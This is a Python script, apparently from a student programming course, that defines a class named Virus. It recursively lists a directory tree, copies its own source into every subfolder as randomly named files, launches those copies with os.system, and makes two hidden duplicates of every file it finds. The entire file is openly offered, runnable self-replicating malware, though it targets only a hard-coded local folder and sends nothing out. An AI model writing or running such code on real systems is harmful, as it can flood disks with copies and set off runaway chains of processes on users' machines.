import os
import shutil 
#shutil is used to copy the content and remove th file 
import random

#Intialize 
class Virus:
    
    def __init__(self, path=None, target_dir=None, repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
        
 # To get the path
        
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        
        for file in current_dir:
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
#Make new file 
   
    def new_virus(self):
        print(self.target_dir)
        for directory in self.target_dir:
            n = random.randint(0,10)
            new_script="Virus"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)
            os.system(new_script + " 1")
#Replcate   
    def replicate(self):
      for dir in self.target_dir:
          filelist = os.listdir(dir)
          for file in filelist:
              abspath = os.path.join(dir,file)
              if not abspath.startswith(".") and not os.path.isdir(abspath):
                  source = abspath
                  for i in range(self.repeat):
                      destination = os.path.join(dir,("."+ file+str(i)))
                      shutil.copyfile(source,destination)
                        
    def Virus_action(self):
      self.list_directories(self.path)
      print(self.target_dir)
      self.new_virus()
      self.replicate()        
                        
if __name__=="__main__":
    current_directory = os.path.abspath("D:\pro_C230\Pro_C230_StudentBoilerCode-main")
    Virus = Virus(path=current_directory)
    #Virus.new_virus()
    #Virus.list_directories("D:\pro_C230\Pro_C230_StudentBoilerCode-main")
    Virus.Virus_action()
